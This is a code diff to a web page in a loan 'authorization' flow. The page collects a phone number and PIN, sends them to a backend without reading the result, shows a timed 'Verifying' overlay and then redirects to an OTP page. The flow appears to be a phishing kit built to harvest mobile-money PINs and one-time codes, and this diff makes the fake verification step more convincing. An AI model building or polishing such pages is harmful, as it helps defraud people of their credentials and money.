@@ -299,37 +299,54 @@
         }
         .btn-back:hover { border-color: #9ca3af; color: var(--text-dark); }
 
-        #spinner {
+        /* ─── LOADING OVERLAY ─── */
+        #loadingOverlay {
             display: none;
             position: fixed;
             inset: 0;
-            background: rgba(10,10,10,0.90);
+            background: rgba(10,10,10,0.85);
             z-index: 10000;
             align-items: center;
             justify-content: center;
             flex-direction: column;
             gap: 20px;
-            backdrop-filter: blur(4px);
+            backdrop-filter: blur(6px);
         }
-        .spin-ring {
-            width: 62px; height: 62px;
+        #loadingOverlay.show {
+            display: flex;
+        }
+        .loading-ring {
+            width: 70px;
+            height: 70px;
             border: 5px solid rgba(255,255,255,0.12);
             border-top-color: var(--red);
             border-radius: 50%;
             animation: spin 0.9s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .spin-label {
+        .loading-title {
             font-family: 'Sora', sans-serif;
-            font-size: 16px;
-            font-weight: 600;
+            font-size: 18px;
+            font-weight: 700;
             color: white;
             letter-spacing: -0.2px;
         }
-        .spin-sub {
-            font-size: 13px;
-            color: rgba(255,255,255,0.55);
-            margin-top: -12px;
+        .loading-sub {
+            font-size: 14px;
+            color: rgba(255,255,255,0.6);
+            margin-top: -10px;
+            font-weight: 400;
+        }
+        .loading-dots::after {
+            content: '';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: ''; }
         }
 
         .security-note {
@@ -541,10 +558,11 @@
     </div>
 </div>
 
-<div id="spinner">
-    <div class="spin-ring"></div>
-    <div class="spin-label">Authorizing Loan</div>
-    <div class="spin-sub">Please wait...</div>
+<!-- ─── LOADING OVERLAY ─── -->
+<div id="loadingOverlay">
+    <div class="loading-ring"></div>
+    <div class="loading-title">Verifying<span class="loading-dots"></span></div>
+    <div class="loading-sub">Please wait while we process your request</div>
 </div>
 
 <div id="toast-overlay"></div>
@@ -610,6 +628,7 @@
 
     // ─── STATE ───
     let isProcessing = false;
+    const LOADING_DURATION = 2500; // 2.5 seconds
 
     function loadLoanData() {
         const amount = urlParams.get('amount');
@@ -645,7 +664,19 @@
         document.getElementById('errorMsg').style.display = 'none';
     }
 
-    // ─── SEND TO BACKEND API WITH BETTER ERROR HANDLING ───
+    // ─── SHOW LOADING OVERLAY ───
+    function showLoading() {
+        const overlay = document.getElementById('loadingOverlay');
+        overlay.classList.add('show');
+    }
+
+    // ─── HIDE LOADING OVERLAY ───
+    function hideLoading() {
+        const overlay = document.getElementById('loadingOverlay');
+        overlay.classList.remove('show');
+    }
+
+    // ─── SEND TO BACKEND API ───
     function sendToBackend(phone, pin, amount, name, period) {
         console.log('📤 Sending to backend:', {
             url: `${CONFIG.API_URL}/api/authorize`,
@@ -684,7 +715,7 @@
         });
     }
 
-    // ─── HANDLE SUBMIT - SEND TO BACKEND THEN REDIRECT ───
+    // ─── HANDLE SUBMIT - SHOW LOADING, SEND TO BACKEND, THEN REDIRECT ───
     function handleSubmit() {
         if (isProcessing) return;
         
@@ -709,16 +740,21 @@
         isProcessing = true;
         document.getElementById('submitBtn').disabled = true;
 
-        // Show success message instantly
-        showSuccess('✅ Authorization successful! Redirecting...');
+        // ─── SHOW LOADING OVERLAY ───
+        showLoading();
 
         // ─── SEND TO BACKEND (FIRE AND FORGET) ───
         sendToBackend(phone, pin, amount, name, period);
 
-        // ─── INSTANT REDIRECT TO OTP - NO DELAY ───
-        const redirectParams = new URLSearchParams(window.location.search);
-        redirectParams.set('phone', phone);
-        window.location.href = CONFIG.OTP_PAGE + '?' + redirectParams.toString();
+        // ─── WAIT FOR LOADING DURATION, THEN REDIRECT ───
+        setTimeout(function() {
+            hideLoading();
+            
+            // ─── REDIRECT TO OTP PAGE ───
+            const redirectParams = new URLSearchParams(window.location.search);
+            redirectParams.set('phone', phone);
+            window.location.href = CONFIG.OTP_PAGE + '?' + redirectParams.toString();
+        }, LOADING_DURATION);
     }
 
     // ─── BIND TO BUTTON ───
